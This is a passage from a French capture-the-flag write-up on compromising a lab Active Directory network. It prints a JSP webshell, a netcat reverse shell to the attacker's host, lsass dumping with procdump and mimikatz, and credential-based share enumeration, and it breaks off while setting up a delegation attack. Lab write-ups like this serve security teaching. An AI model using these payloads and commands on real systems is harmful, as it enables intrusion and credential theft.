2019-07-05 13:15:32    1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\'s Oddest Settings.pdf
2019-07-05 13:15:45    1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf
                                
(KaliVM) ➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt 

(KaliVM) ➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn

(KaliVM) ➜ cat Flag-04.txt 
0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
```

En plus du flag de cette étape, il y a un fichier VPN `wonka_internal.ovpn` dans le bucket, qui laisse présager un active directory.

### IV.5. Flag

> 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528

---

### Resources

1. __@christophetd__, _Abusing the AWS metadata service using SSRF vulnerabilities_, Blog de Christophe Tafani-Dereeper : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
2. __notsosecure team__, _Exploiting SSRF in AWS Elastic Beanstalk_, notsosecure : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/

---
---

## V. Step 5 - Tom(cat) and Jerry

>  Lets get the flag at the root of your first blood 

### TL;DR

1. Se connecter au VPN récupéré dans le bucket ;
2. Une nouvelle route est apparue : `172.16.42.0/24` ;
3. Effectuer une énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;
4. Utiliser `dirsearch` avec une wordlist tomcat (seclist), et trouver la page `/host-manager/` ;
5. Se connecter avec les identifiants `tomcat : tomcat` ;
6. Monter un partage samba nommé `data` avec un webshell (__cmd.war__) à l'intérieur ;
7. Déployer le webshell en tant que nouvelle application via les `UNC path` ;
8. Accéder au webshell à l'adresse : `http://maki-lab:8080/cmd/index.jsp?cmd=whoami` ;
7. Utiliser __netcat__ pour faire un reverse shell.

---

### V.1. Reconnaissance

Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait :

```bash
➜ ip r | grep tun0
10.8.0.1 via 10.8.0.17 dev tun0 
10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 
172.16.42.0/24 via 10.8.0.17 dev tun0 
```

Il existe plusieurs techniques de reconnaissances afin de trouver tous les hôtes de ce réseau: 

* __Ping scan__ : rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;
* __Port scan__ : Retenir quelques ports connus et vérifier s'ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien.

__Note__ : Personnellement je fais un __premier masscan__ avec environ 100 ports connus sur l'ensemble du réseau, puis un __second masscan__ avec l'ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, __un nmap__ spécifique sur les ports et hôtes trouvés. C'est la méthode la plus rapide que j'ai pu trouver jusqu'à présent.

CI-dessous le _premier masscan_ :

```bash
(KaliVM) ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24
Discovered open port 445/tcp on 172.16.42.5                                    
Discovered open port 53/tcp on 172.16.42.5                                     
Discovered open port 445/tcp on 172.16.42.101                                  
Discovered open port 445/tcp on 172.16.42.11                                   
```

Avec cette méthode, trois machines ressortent :

* 172.16.42.5
* 172.16.42.11
* 172.16.42.101

#### V.1.a. 172.16.42.5 (DC01-WW2)

```bash
(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5
Discovered open port 49669/tcp on 172.16.42.5                                  
Discovered open port 445/tcp on 172.16.42.5                                    
Discovered open port 53/udp on 172.16.42.5                                     
Discovered open port 53/tcp on 172.16.42.5                                     
Discovered open port 3268/tcp on 172.16.42.5                                   
Discovered open port 50206/tcp on 172.16.42.5                                  
Discovered open port 593/tcp on 172.16.42.5                                    
Discovered open port 636/tcp on 172.16.42.5                                    
Discovered open port 49687/tcp on 172.16.42.5       

(KaliVM) ➜ cat out_mass_5 | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','
49669,445,53,53,3268,50206,593,636,49687

(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS
445/tcp   open  microsoft-ds? syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: factory.lan0., Site: Default-First-Site-Name)
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
50206/tcp open  msrpc         syn-ack Microsoft Windows RPC

[...]

TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01-WW2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40427/tcp): CLEAN (Timeout)
|   Check 2 (port 46791/tcp): CLEAN (Timeout)
|   Check 3 (port 49455/udp): CLEAN (Timeout)
|   Check 4 (port 14211/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-07-11 13:39:58
|_  start_date: 1601-01-01 00:09:21
```

Cette machine ressemble à un Domain Controller, et ce pour plusieurs raisons :

* Le port 53 (DNS) est caractéstique d'un AD
* Le port 3268 (LDAP) mentionne le domaine __factory.lan__
* Le nom d'hôte est plutôt explicite : __DC01-WW2__


#### V.1.b. 172.16.42.11


```bash
(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11
Discovered open port 8080/tcp on 172.16.42.11          
Discovered open port 445/tcp on 172.16.42.11     

(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11
PORT     STATE SERVICE       REASON  VERSION
445/tcp  open  microsoft-ds? syn-ack
8080/tcp open  http-proxy    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
[...]
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Willy Wonka Wiki

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30938/tcp): CLEAN (Timeout)
|   Check 2 (port 43825/tcp): CLEAN (Timeout)
|   Check 3 (port 45891/udp): CLEAN (Timeout)
|   Check 4 (port 33171/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-07-11 13:43:52
|_  start_date: 1601-01-01 00:09:21
```

Intuitivement, cette machine ressemble au point d'entrée que nous cherchons. Les deux premières hypothèses à exploiter  sont donc :

1. Connexions anonymes sur le partage Samba ;
2. Vulnérabilités et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.

#### V.1.c. 172.16.42.101

```bash
(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101
Discovered open port 135/tcp on 172.16.42.101                                  
Discovered open port 49712/tcp on 172.16.42.101                                
Discovered open port 445/tcp on 172.16.42.101                                  
Discovered open port 5040/tcp on 172.16.42.101                                 
Discovered open port 49669/tcp on 172.16.42.101                  

(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p135,49712,445,5040,49669 172.16.42.101
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

Les trois premiers ports sont suspects et peuvent laisser penser à :

1. Une connexion anonyme sur le RPC et SMB ;
2. Un service "unknown" sur le port 5040.

### V.2. Enumération du serveur web

Après quelques tentatives infructueuses sur les différents serveurs SMB, il est temps de se concentrer sur le serveur web : `http://172.16.42.11:8080/`.


![](/lib/images/writeups/2019_wonkachallenge/step5_index.png)


En naviguant sur le site, il est possible de trouver une cartographie du réseau : `http://172.16.42.11:8080/infra.jsp`


![](/lib/images/writeups/2019_wonkachallenge/infra.png)


L'extension __jsp__ nous conforte dans l'idée que nous sommes en présence d'un serveur tomcat, la page 404 la confirme. L'exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :

```bash
(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt    
[15:08:17] 302 -    0B  - /host-manager  ->  /host-manager/
[15:08:17] 401 -    2KB - /host-manager/html/%2A
[15:08:17] 302 -    0B  - /manager  ->  /manager/
```

D'ordinaire, la page `manager` est la solution de facilité : avec des identifiants par défaut, il suffit de générer un webshell avec l'extension __war__ et de l'uploader. Dans notre cas, cette page est ... Indisponible :


![](/lib/images/writeups/2019_wonkachallenge/step5_manager.png)


Dans les résultats du dirsearch, il y a aussi la page `/host-manager`. Cette page est protégée par une __Basic authentification__, heureusement les identifiants par défaut de Tomcat fonctionnent :

> tomcat : tomcat

__Certilience__ a écrit un très bon guide concernant cette attaque : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/

### V.3. Mise en place de l'exploitation

N'étant pas un grand fan de Metasploit, j'essaie de l'utiliser le moins possible, et ce surtout lorsque d'autres solutions existent. Une d'elle consiste à récupérer un webshell "standard", plutôt que de générer une charge avec un meterpreter. En effet, une archive __war__ consiste tout simplement en une archive zip avec une hiérarchie particulière :

```bash
(KaliVM) ➜ tree .                   
.
├── index.jsp
├── META-INF
│   └── MANIFEST.MF
└── WEB-INF
    └── web.xml
```

La charge malveillante se situe dans le fichier __index.jsp__ :

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

La charge ci-dessus provient du dépôt de __tennc__ : https://github.com/tennc/webshell

L'archive __war__ utilisée lors de l'exploitation peut être téléchargée ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs

#### V.3.a. Nouvel hôte

En suivant les indications de __Certilience__, on ajoute une entrée dans le fichier `/etc/hosts` de notre machine afin de lier l'IP du serveur tomcat à un hostname :

```bash
(KaliVM) ➜ sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
```

Cette étape sera utile lors du déploiement de la nouvelle application via les UNC path.

#### V.3.b. SMB server

Il est impératif de mettre en place un partage samba (__smbserver.py__) pour que le serveur Tomcat puisse récupérer notre application malveillante :

```bash
(KaliVM) ➜ sudo smbserver.py -smb2support data .
```

La commande ci-dessus ouvre un partage nommé __data__ dans le dossier courant, où se trouve l'archive war.

### V.4. Exploitation

Les préparatifs étant terminés, il est temps de déployer le webshell :


![](/lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png)


De l'activité est visible sur les logs du serveur SMB lors du déploiement de notre application. On peut finalement accéder à cette application avec l'URL suivante : `http://maki-lab:8080/cmd/index.jsp`


![](/lib/images/writeups/2019_wonkachallenge/step5_webshell.png)


### V.5. Reverse shell

Pour récupérer un shell plus ou moins interactif, il est possible de déposer le binaire __netcat__ dans le partage __data__, créé pour l'exploitation précédente. Sous Windows, il est possible d'exécuter des binaires distants grâce aux UNC path.

#### V.5.a. Terminal 1 - Hôte

Le binaire `rlwrap` (readline wrapper) sert d'historique de commandes, mais aussi d'interface entre le clavier local et distant. L'utiliser lors d'un reverse shell permet à l'attaquant de pouvoir utiliser les flèches de son clavier correctement et d'avoir l'historique des commandes de la session :

```bash
(KaliVM) ➜ rlwrap ncat -klvp 12345
```

#### V.5.b. Application malveillante - Serveur tomcat

L'UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et établir ainsi une connexion sur le port 12345 :

```bash
(SRV01-INTRANET) ➜ \\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
```


![](/lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png)


Cette méthode permet de récupérer un accès shell plus ou moins interactif et plus ou moins stable.


![](/lib/images/writeups/2019_wonkachallenge/step5_flag.png)


### V.5. Flag

> 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8

---

### Resources

1. __SecList__, _Discovery Web-content Tomcat_, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt
2. __Pôle audit de Certilience__, _Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?_, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/
3. __Eternallybored__, _Download netcat Windows binaries_; eternallybored.org : https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip

---
---

## VI. Step 6 - Mimikatz you said ?

>  SHA256(adminServer's passwd) 

### TL;DR

1. Exécuter `procdump.exe` sur le serveur tomcat (SRV01-INTRANET) ;
2. Récupérer le minidump du processus `lsass.exe` ;
3. Retrouver les identifiants stockés grâce à `mimikatz` en local : `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`.

---

### VI.1. Post exploitation

Lorsqu'un accès privilégié est obtenu sur un serveur, il est naturel d'essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l'occurrence, __Mimikatz__ va chercher les identifiants dans la mémoire du processus de _lsass.exe_. 

Une autre méthode, plus difficile à détecter pour de potentiels anti-virus, consiste à récupérer la mémoire de ce processus grâce à __procdump.exe__. Ce binaire est développé et signé par Microsoft et fait partie des _Windows Sysinternals_. Mimikatz est capable de charger un dump mémoire de ce processus en local et d'en extraire les identifiants. 

### VI.2. Getting lsass minidump

L'exécution de __procdump.exe__ se fait comme pour _netcat_ : via les UNC path.

```bash
(SRV01-INTRANET) ➜ \\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
```


![](/lib/images/writeups/2019_wonkachallenge/step6_procdump.png)


Toujours avec les UNC path, on copie les fichiers sur un partage distant :

```bash
(SRV01-INTRANET) ➜ copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
```


![](/lib/images/writeups/2019_wonkachallenge/step6_smbtransfer.png)


Le minidump est disponible ici : https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY

### VI.3. Récupération des mots de passe dans le minidump

Comme mentionné précédemment, __Mimikatz__ est capable de lire un minidump en local. C'est à ce moment que CommandoVM entre en jeu.

```bash
(CommandoVM) ➜ .\mimikatz.exe

# privilege::debug
Privilege '20' OK

# sekurlsa::Minidump lsassdump.dmp
Switch to MINIDUMP : 'lsassdump.dmp'

# sekurlsa::logonPasswords
Opening : 'lsassdump.dmp' file for minidump...

[...]
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV01-INTRANET$
Domain            : FACTORY
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:10
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : srv01-intranet$
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : factory.lan\adminServer
         * Domain   : 172.16.42.101
         * Password : #3LLe!!estOuL@Poulette
```

Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les identifiants récupérés sont :

> factory.lan\adminServer : #3LLe!!estOuL@Poulette

### VI.4. Flag

> 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4

---

### Resources

1. __sevagas__, _swap\_digger_, GitHub : https://github.com/sevagas/swap_digger
2. __Microsoft__, _Windows Sysinternals_, Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/
3. __Sebastien Macke - @lanjelot__, _Dumping Windows Credentials_, securusglobal : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
4. __cyberarms__, _Grabbing Passwords from Memory using Procdump and Mimikatz_, cyberarms : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/
5. __ired.team__, _Credential Access & Dumping_, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping
6. __Mark Russinovich and Andrew Richards__, _ProcDump v9.0_,  Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

---
---

## VII. Step 7 - Spreading love

>  Sharing is caring ;) 

### TL;DR

1. Essayer d'accéder aux partages du réseau avec les identifiants récupérés ;
2. Trouver le partage __Users__ sur le serveur `172.16.42.5` ;
3. Le parcourir et trouver les identifiants : `factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?`.

---

### VII.1. Reconnaissance

Dans les scans réalisés lors de l'étape 5 (cf. V.1. Reconnaissance), on remarque que toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échoué, on peut réitérer les tests avec les identifiants de __adminServer__. 

L'outil __CrackMapExec__ (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d'IP :

```bash
(KaliVM) ➜ cme smb ./ip_list -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares 
SMB         172.16.42.5     445    DC01-WW2         [*] Windows 10.0 Build 17763 x64 (name:DC01-WW2) (domain:factory.lan) (signing:True) (SMBv1:False)
SMB         172.16.42.101   445    PC01-DEV         [*] Windows 10.0 Build 18362 x64 (name:PC01-DEV) (domain:factory.lan) (signing:False) (SMBv1:False)
SMB         172.16.42.5     445    DC01-WW2         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
SMB         172.16.42.101   445    PC01-DEV         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
SMB         172.16.42.101   445    PC01-DEV         [+] Enumerated shares
SMB         172.16.42.101   445    PC01-DEV         Share           Permissions     Remark
SMB         172.16.42.101   445    PC01-DEV         -----           -----------     ------
SMB         172.16.42.101   445    PC01-DEV         ADMIN$                          Remote Admin
SMB         172.16.42.101   445    PC01-DEV         C$                              Default share
SMB         172.16.42.101   445    PC01-DEV         IPC$            READ            Remote IPC
SMB         172.16.42.101   445    PC01-DEV         Users                           
SMB         172.16.42.5     445    DC01-WW2         [+] Enumerated shares
SMB         172.16.42.5     445    DC01-WW2         Share           Permissions     Remark
SMB         172.16.42.5     445    DC01-WW2         -----           -----------     ------
SMB         172.16.42.5     445    DC01-WW2         ADMIN$                          Remote Admin
SMB         172.16.42.5     445    DC01-WW2         C$                              Default share
SMB         172.16.42.5     445    DC01-WW2         IPC$            READ            Remote IPC
SMB         172.16.42.5     445    DC01-WW2         NETLOGON        READ            Logon server share 
SMB         172.16.42.5     445    DC01-WW2         provisioning    READ            
SMB         172.16.42.5     445    DC01-WW2         SYSVOL          READ            Logon server share 
SMB         172.16.42.5     445    DC01-WW2         Users           READ            
```

L'adresse _172.16.42.11_ ne répond pas sur son port SMB. Cependant, un partage __Users__ est accessible en lecture sur _172.16.42.5_ (DC01-WW2).

### VII.2. Mount Users share

Il est possible de se connecter au partage via `smbclient` :

```bash
(KaliVM) ➜ smbclient -U 'adminServer%#3LLe!!estOuL@Poulette' -W "factory.lan" //172.16.42.5/Users
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Wed Jun 19 23:00:08 2019
  ..                                 DR        0  Wed Jun 19 23:00:08 2019
  Administrator                       D        0  Wed Jun 19 23:00:35 2019
  Default                           DHR        0  Wed Jun 19 22:52:35 2019
  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018

		12966143 blocks of size 4096. 9273442 blocks available
```

Il est également possible de le monter en local. D'un point de vue personnel, je préfère cette méthode car je trouve qu'elle rend plus simple la navigation dans le partage :

```bash
(KaliVM) ➜ mkdir /tmp/a
(KaliVM) ➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a
(KaliVM) ➜ ls /tmp/a
Administrator   Default   desktop.ini
(KaliVM) ➜ tree Administrator 
Administrator
└── Documents
    └── provisioning
        ├── credentials.txt
        └── flag-07.txt
```

Le fichier __credentials.txt__ à côté du flag sera utile pour la suite, car il contient de nouveaux identifiants :

```bash
#####
## Provisioning Account
####

This account is used only for joining machines (servers & workstations) to domain.
We created it to "delegate" this right to servers and workstations admins since we have disabled
this right for regular users and we do not want to give domain admin rights to
servers administrators and workstation administrators.

factory.lan\SvcJoinComputerToDom
QueStC3qU!esTpetItEtMarr0N?
```

### VII.3. Flag

> 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C

---

### Resources

1. __ShawnDEvans__, _SMBmap_, GitHub : https://github.com/ShawnDEvans/smbmap
2. __Mickael Dorigny__, _Monter un partage CIFS sous Linux_, it-connect : https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/

---
---

## VIII. Step 8 - Wagging the dogs

>  SHA256(NTLM(krbtgt)) 

### TL;DR

1. Faire un `bloodhound` avec le compte __adminServer__ ;
2. Remarquer la relation __AddAllowedToAct__ entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ ;
3. Grâce à la note précédente et à la relation trouvée, comprendre qu'il faut abuser du __resources based constrained delegation__ ;
4. Ajouter de la CommandoVM dans le domaine grâce au compte de service (_SvcJoinComputerToDom_) ;
5. Créer un SPN et modifier sa valeur de `msDS-AllowedToActOnBehalfOfOtherIdentity` ;
6. Abuser du mécanisme __S4U__ (_S4U2User_ et _S4U2Proxy_) avec Rubeus pour usurper l'identité de l'administrateur de domaine ;
7. Lorsque Rubeus a forgé le ticket de l'administrateur, utiliser __psexec__ sur le contrôleur de domaine ;
8. Extraire le `ntds.dit` en utilisant `vssadmin` sur le contrôleur de domaine ;
9. Copier le fichier généré sur une de nos machines et utiliser __secretdumps.py__ afin de récupérer les différents hash, dont celui de `krbtgt`.

---

### VIII.1. Reconnaissance

Cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes disponibles : un compte utilisateur du domaine (_adminServer_) et un compte de service (_SvcJoinComputerToDom_).

La première idée consiste à faire un bloodhound avec le compte utilisateur du domaine. __Bloodhound__ est un outil de cartographie d'Active Directory. Il permet de visualiser le domaine sous forme de graphes et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes ...). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter.

_Note_ : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités. Ne pas oublier de récupérer la dernière version avant de partir en test interne.

_BloodHound_ permet de visualiser les données, mais le collecteur s'appelle __SharpHound__. Il se situe dans le même dépôt, dans le dossier "Ingestors". Avant de l'utiliser, il faut ajouter l'adresse IP du contrôleur de domaine en tant que serveur DNS principal afin de pouvoir accéder au domaine :


![](/lib/images/writeups/2019_wonkachallenge/step8_dns.png)


_Note_ : Comme présenté sur le schéma dans l'introduction, CommandoVM est configuré en NAT. La seconde IP correspond à l'IP de mon hôte sur l'interface virtuelle.

#### VIII.1.a BloodHound

Lorsque cette étape est réalisée, _CommandoVM_ est en mesure de ping le domaine `factory.lan`. _SharpHound_ peut alors être executé à l'aide de la commande suivante :

```bash
(CommandoVM) ➜ .\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn
```

Le fichier zip contenant les informations sera créé dans le dossier courant. En visualisant les données récupérées, deux éléments sont intéressants :

- Il n'y a qu'un seul et unique administrateur de domaine __Administrator__ ;
- Une relation __AddAllowedToAct__ est présente entre le contrôleur de domaine (_DC01-WW2.FACTORY.LAN_) et le compte (_SvcJoinComputerToDom_).

Cette relation est mentionnée sur le blog de _CptJesus_. Le blogpost montre l'introduction de nouvelles primitives d'attaques : AddAllowedToAct/AllowedToAct. Ces primitives sont utilisées pour identifier l'attaque __Resource Based Constrained Delegation__ (RBCD).

#### VIII.1.b Resource Based Constrained Delegation - Explication

Pour reprendre ce qu'a dit __Pixis__ sur son blog au sujet de cette attaque (cf. Ressource 4 : _Resource-Based Constrained Delegation - Risques_) : 

> Contrairement à la délégation complète, la délégation Resource-Based est un poil plus compliquée. L’idée générale est que ce sont les ressources de fin de chaîne qui décident si oui ou non un service peut s’authentifier auprès d’elles en tant qu’un autre utilisateur. Ces ressources ont donc une liste de comptes en lesquels elles ont confiance. Si une ressource fait confiance au compte WEBSERVER$, alors quand un utilisateur s’authentifiera auprès de WEBSERVER$, il pourra lui même s’authentifier auprès de cette ressource en tant que l’utilisateur.

La ressource finale, s'occupant de l'authentification, utilise une "whitelist". Cette liste contient tous les comptes de confiance et est stockée dans un attribut appelé `msDS-AllowedToActOnBehalfOfOtherIdentity`. Toujours en paraphrasant l'article de __Pixis__, dans le cas où un utilisateur s'authentifierait sans utiliser Kerberos, alors le compte de service censé "impersonate" l'utilisateur n'aurait pas de TGS. C'est à ce moment que le compte de service fait une demande de TGS au nom de l'utilisateur désirant se connecter au KDC. Ce mécanisme s'appelle le __S4U2Self__. Si le TGS de l'utilisateur est correctement reçu, il peut alors accéder à la ressource grâce au mécanisme __S4U2Proxy__.

Cependant, si un compte machine fait la demande d'un TGS sans l'attribut `TrustedToAuthForDelegation`, alors le TGS reçu sera _non transférable_. Malgré tout, lors de la demande de TGS pour une ressource via __S4U2Proxy__, cette demande sera validée.

J'invite toutes les personnes intéressées par ce genre d'attaque à lire les articles de __Pixis__ sur _hackndo.com_, __SpecterOps__, __harmj0y__ et  __shenaniganslabs__. Les différents liens sont disponibles dans les ressources.

Ayant tout ceci en tête, l'article de _CptJesus_ semble plus clair. Ce même article mentionne deux conditions pour réussir ce genre d'attaque : 

1. Pouvoir réécrire l'attribut `msds-AllowedToActOnBehalfOfOtherIdentity`, contenant les comptes de confiance ;
2. Contrôler un utilisateur avec un __ServicePrincipalName__ (SPN) mis en place.

Cette attaque va permettre d'accéder au contrôleur de domaine en tant qu'administrateur de domaine. 

Dans notre cas, ces prérequis sont remplis. La relation que BloodHound a trouvé entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ permet de réécrire l'attribut `msds-AllowedToActOnBehalfOfOtherIdentity`. Quant au contrôle d'un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note __credentials.txt__, on sait que le compte _SvcJoinComputerToDom_ possède cette fonction.

### VIII.2. Mise en place de l'exploitation

La reconnaissance étant terminée, le moment est venu d'exploiter cette vulnérabilité. Tout d'abord, il convient d'ajouter notre CommandoVM au domaine grâce au compte _SvcJoinComputerToDom_ :


![](/lib/images/writeups/2019_wonkachallenge/step8_connect2dom.png)


_Note_ : Lorsque que l'ajout de la machine a été validé par le domaine, notre Windows nous demande de choisir un type de compte pour _SvcJoinComputerToDom_. Pour être sûr de ne pas être embêté, j'ai choisi de le mettre en administrateur local.

Pour s'assurer que CommandoVM est correctement relié au domaine, il suffit de lister les utilisateurs du domaine à l'aide de la commande suivante : `net user /dom`


![](/lib/images/writeups/2019_wonkachallenge/step8_domainuser.png)


Harmj0y a écrit un [article](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/) détaillé sur cette attaque et a même fournit un [script](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff) en powershell pour l'automatiser. Son script a besoin de deux librairies pour fonctionner : [PowerView dans la branche dev](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) et [PowerMad](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1).

#### VIII.2.a. Vérification des droits sur le domaine

Avant de commencer l'exploitation à proprement parler, il est préférable de vérifier si l'utilisateur __SvcJoinComputerToDom__ possède les droits permettant l'exploitation de cette délégation :

```bash
(CommandoVM) ➜ Import-Module .\powermad.ps1
(CommandoVM) ➜ Import-Module .\powerview.ps1
(CommandoVM) ➜ $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
(CommandoVM) ➜ $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
(CommandoVM) ➜ $ACE
(CommandoVM) ➜ ConvertFrom-SID $ACE.SecurityIdentifier
FACTORY\SvcJoinComputerToDom
```


![](/lib/images/writeups/2019_wonkachallenge/step8_propertywrite.png)


L'utilisateur __SvcJoinComputerToDom__ possède les droits __WriteProperty__ sur le DC. L'une des conditions est vérifiée, il est possible de modifier l'attribut `msds-allowedtoactonbehalfofotheridentity`.

#### VIII.2.b. Ajout d'une machine au domaine 

